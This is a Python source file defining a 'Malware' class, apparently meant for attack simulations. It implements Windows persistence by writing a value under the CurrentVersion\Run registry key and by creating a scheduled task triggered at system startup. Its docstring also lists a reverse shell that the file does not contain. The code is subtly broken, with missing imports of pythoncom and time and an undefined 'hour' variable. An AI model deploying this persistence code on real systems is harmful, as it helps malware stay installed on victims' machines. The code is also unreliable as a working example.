import random
import string
import winreg
import datetime
from win32com.taskscheduler import taskscheduler



class Malware(object):
    """A generic malware class that provides helper functions
    that will probably be shared by mutliple simulations. 
    
    Provides:
        1. Registry key creation
        2. Schedule task creation
        3. Reverse Shell

    Attributes:
        path `str` : The path where the malware drops itself.
        name `str` : The name of the executable.
    
    """

    def __init__(self, path, name):
        self.name = name
        self.path = path

    def random_string(self):
        """Generate a random alphanumeric string of variable length"""
        return ''.join(
            random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits
        ) for _ in range(random.randint(8,24)))

    
    def create_registry_key(self, key, value,
                            path=r'Software\Microsoft\Windows\CurrentVersion\Run',
                            hive=winreg.HKEY_CURRENT_USER):
        """
        Creates the persistance registry key with the specific value at the path

        :param key: The key name
        :param value: The value name
        :param path: The path to registry key. Default is CurrentVersion Run
        :param hive: Which hive this key belongs to.
        """

        reg_key = winreg.OpenKey(
            hive, path, 0, winreg.KEY_SET_VALUE)

        with reg_key:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)

    def create_scheduled_task(self, name, cmd):
        ts = pythoncom.CoCreateInstance(taskscheduler.CLSID_CTaskScheduler,None,
                                    pythoncom.CLSCTX_INPROC_SERVER,
                                    taskscheduler.IID_ITaskScheduler)
        task = ts.NewWorkItem(name)
        task.SetApplicationName(cmd[0])
        task.SetParameters(' '.join(cmd[1:]))
        task.SetPriority(taskscheduler.REALTIME_PRIORITY_CLASS)
        task.SetFlags(taskscheduler.TASK_FLAG_RUN_ONLY_IF_LOGGED_ON)
        task.SetAccountInformation('', None)
        ts.AddWorkItem(name, task)
        run_time = time.localtime(time.time() + 300)
        tr_ind, tr = task.CreateTrigger()
        tt = tr.GetTrigger()
        tt.Flags = 0
        tt.BeginYear = int(time.strftime('%Y', run_time))
        tt.BeginMonth = int(time.strftime('%m', run_time))
        tt.BeginDay = int(time.strftime('%d', run_time))
        tt.StartMinute = int(time.strftime('%M', run_time))
        tt.StartHour = int(time.strftime('%H', run_time))
        tt.StartHour = hour
        
        # Trigger on startup
        tt.TriggerType = int(taskscheduler.TASK_EVENT_TRIGGER_AT_SYSTEMSTART)
        tr.SetTrigger(tt)
        pf = task.QueryInterface(pythoncom.IID_IPersistFile)
        pf.Save(None,1)
        task.Run()
        task = ts.Activate(name)
